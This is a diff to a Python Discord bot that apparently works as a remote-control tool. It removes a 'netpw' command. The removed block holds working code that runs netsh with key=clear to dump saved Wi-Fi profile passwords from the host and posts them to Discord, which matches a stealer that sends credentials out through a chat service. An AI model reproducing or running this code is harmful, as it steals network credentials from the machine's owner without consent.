@@ -2069,25 +2069,4 @@ async def wlan(ctx):
     else:
         await ctx.send("No WLAN networks found.")
 
-import re
-
-@bot.command(help="Show Wi-Fi names and passwords")
-async def netpw(ctx):
-    try:
-        profiles_info = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles'], encoding='utf-8', errors='ignore')
-        profiles = re.findall('All User Profile\s*:\s(.*)', profiles_info)
-
-        for profile in profiles:
-            try:
-                profile_info = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', profile, 'key=clear'], encoding='utf-8', errors='ignore')
-                password = re.search('Schl.sselsinhalt\s*:\s(.*)', profile_info)
-                if password:
-                    await ctx.send(f"WLAN-Profil: {profile}\nPasswort: {password.group(1)}")
-                else:
-                    await ctx.send(f"WLAN-Profil: {profile}\nPasswort: Nicht gefunden")
-            except subprocess.CalledProcessError:
-                await ctx.send(f"Profil '{profile}' nicht gefunden.")
-    except subprocess.CalledProcessError:
-        await ctx.send("Fehler beim Abrufen der WLAN-Profile.")
-
 bot.run(TOKEN)
